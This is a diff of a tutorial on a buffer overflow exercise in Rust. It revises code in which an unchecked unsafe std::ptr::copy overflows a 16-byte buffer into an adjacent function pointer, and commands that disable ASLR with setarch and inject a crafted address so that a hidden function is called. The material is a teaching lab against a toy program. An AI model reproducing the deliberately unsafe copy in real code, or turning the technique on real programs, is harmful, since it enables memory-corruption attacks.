@@ -64,13 +64,32 @@ struct Hackvist {
 }
 ```
 
-We'll also need some unsafe function, to copy bytes without checking the size of the destination buffer. This can be done with `std::ptr::copy()`.
+We'll also need some unsafe function, to copy bytes without checking the size of the destination buffer. This can be done with `std::ptr::copy()`:
+```Rust
+unsafe {
+    std::ptr::copy(
+        input_bytes.as_ptr(),
+        hackvist.buffer.as_mut_ptr(),
+        input_bytes.len(),
+    )
+}
+```
 
 At the end, to make our life easier, we'll add printing of `abracadabra()` function address, as well as, the content of `hackvist.point`, so we can find out what should we provide as an input to call `abracadabra()`:
 ```Rust
 println!("abracadabra function address: x{:0x}", abracadabra as usize);
-println!("hackvist.point after strcpy: x{:0x}", hackvist.point as usize);
-println!("hackvist.point after strcpy (in chars): {:?}", (hackvist.point as usize as u64).to_le_bytes().into_iter().map(|b| char::from(b)).collect::<String>());
+println!(
+    "hackvist.point after strcpy: x{:0x}",
+    hackvist.point as usize 
+);
+println!(
+    "hackvist.point after strcpy (in chars): {:?}",
+    (hackvist.point as usize as u64)
+        .to_le_bytes()
+        .into_iter()
+        .map(|b| char::from(b))
+        .collect::<String>()
+);
 ```
 
 Taken all of this together, this is the source code for this buffer overflow exercise:
@@ -97,14 +116,28 @@ fn main() {
         buffer: [0; 16],
         point: 0 as *const fn() -> (),
     };
-
+    
     unsafe {
-        std::ptr::copy(input_bytes.as_ptr(), hackvist.buffer.as_mut_ptr(), input_bytes.len())
+        std::ptr::copy(
+            input_bytes.as_ptr(),
+            hackvist.buffer.as_mut_ptr(),
+            input_bytes.len(),
+        )
     }
-
+    
     println!("abracadabra function address: x{:0x}", abracadabra as usize);
-    println!("hackvist.point after strcpy: x{:0x}", hackvist.point as usize);
-    println!("hackvist.point after strcpy (in chars): {:?}", (hackvist.point as usize as u64).to_le_bytes().into_iter().map(|b| char::from(b)).collect::<String>());
+    println!(
+        "hackvist.point after strcpy: x{:0x}",
+        hackvist.point as usize 
+    );
+    println!(
+        "hackvist.point after strcpy (in chars): {:?}",
+        (hackvist.point as usize as u64)
+            .to_le_bytes()
+            .into_iter()
+            .map(|b| char::from(b))
+            .collect::<String>()
+    );
 
     if hackvist.point as usize == 0 {
         println!("Try again");
@@ -119,12 +152,12 @@ fn main() {
 
 Now, let's try to build it:
 ```
-$ cargo build
+$ rustc --edition 2021 buffer-overflow.rs
 ```
 And run (the values can differ on your computer):
 ```
-$ ./target/debug/buffer-overflow "AAAABBBB"
-abracadabra function address: x5597c4265bb0
+$ ./buffer-overflow "AAAABBBB"
+abracadabra function address: x5595670e21d0
 hackvist.point after strcpy: x0
 hackvist.point after strcpy (in chars): "\u{0}\u{0}\u{0}\u{0}\u{0}\u{0}\u{0}\u{0}"
 Try again
@@ -132,8 +165,8 @@ Try again
 This time the input string was too short `AAAABBBB` has only 8 bytes, so it wasn't enough to overflow our 16 byte buffer and write into `hackvist.point` function pointer. Let's try with longer input:
 
 ```
-$ ./target/debug/buffer-overflow "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
-abracadabra function address: x55e1e06cbbb0
+$ ./buffer-overflow "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
+abracadabra function address: x55a4246391d0
 hackvist.point after strcpy: x4646464645454545
 hackvist.point after strcpy (in chars): "EEEEFFFF"
 Segmentation fault (core dumped)
@@ -142,34 +175,33 @@ As we can see, we managed to overflow the buffer and write into the function poi
 
 Right now we'll want to change letters `EEEEFFFF` in the input string into `abracadabra()` function address. Let's try:
 ```
-$ ./target/debug/buffer-overflow \
-> $(python -c 'print "AAAABBBBCCCCDDDD\xb0\xbb\x6c\xe0\xe1\x55"')
-abracadabra function address: x55d7609eabb0
-hackvist.point after strcpy: x55e1e06cbbb0
-hackvist.point after strcpy (in chars): "°»làáU\u{0}\u{0}"
+$ ./buffer-overflow $(python -c 'print "AAAABBBBCCCCDDDD\xd0\x91\x63\x24\xa4\x55"')
+abracadabra function address: x55f9ece391d0
+hackvist.point after strcpy: x55a4246391d0
+hackvist.point after strcpy (in chars): "Ð\u{91}c$¤U\u{0}\u{0}"
 Segmentation fault (core dumped)
 ```
 
-It didn't work, even though the `hackvist.point` was "correctly" overwritten with `x55e1e06cbbb0`, which is exactly the `abracadabra()` function address from our previous run: `x55e1e06cbbb0`.
+It didn't work, even though the `hackvist.point` was "correctly" overwritten with `x55a4246391d0`, which is exactly the `abracadabra()` function address from our previous run: `x55a4246391d0`.
 
 The reason for this is that on my machine, [address space layout randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization) is used to make buffer overflow attacks harder. This can be turned off by running the binary with:
 ```
-$ setarch x86_64 -R ./target/debug/buffer-overflow \
-> $(python -c 'print "AAAABBBBCCCCDDDD\xb0\xbb\x6c\xe0\xe1\x55"')
-abracadabra function address: x55555555cbb0
-hackvist.point after strcpy: x55e1e06cbbb0
-hackvist.point after strcpy (in chars): "°»làáU\u{0}\u{0}"
+$ setarch x86_64 -R ./buffer-overflow \
+> $(python -c 'print "AAAABBBBCCCCDDDD\xd0\x91\x63\x24\xa4\x55"')
+abracadabra function address: x55555555e1d0
+hackvist.point after strcpy: x55a4246391d0
+hackvist.point after strcpy (in chars): "Ð\u{91}c$¤U\u{0}\u{0}"
 Segmentation fault (core dumped)
 ```
 
-This time the address has changed once again, but from now on, the `abracadabra()` function address shouldn't change, so we can use `x55555555cbb0` address in our input:
+This time the address has changed once again, but from now on, the `abracadabra()` function address shouldn't change, so we can use `x55555555e1d0` address in our input:
 
 ```
-$ setarch x86_64 -R ./target/debug/buffer-overflow \
-> $(python -c 'print "AAAABBBBCCCCDDDD\xb0\xcb\x55\x55\x55\x55"')
-abracadabra function address: x55555555cbb0
-hackvist.point after strcpy: x55555555cbb0
-hackvist.point after strcpy (in chars): "°ËUUUU\u{0}\u{0}"
+$ setarch x86_64 -R ./buffer-overflow \
+> $(python -c 'print "AAAABBBBCCCCDDDD\xd0\xe1\x55\x55\x55\x55"')
+abracadabra function address: x55555555e1d0
+hackvist.point after strcpy: x55555555e1d0
+hackvist.point after strcpy (in chars): "ÐáUUUU\u{0}\u{0}"
 Abracadabra! Function called!
 ```
 
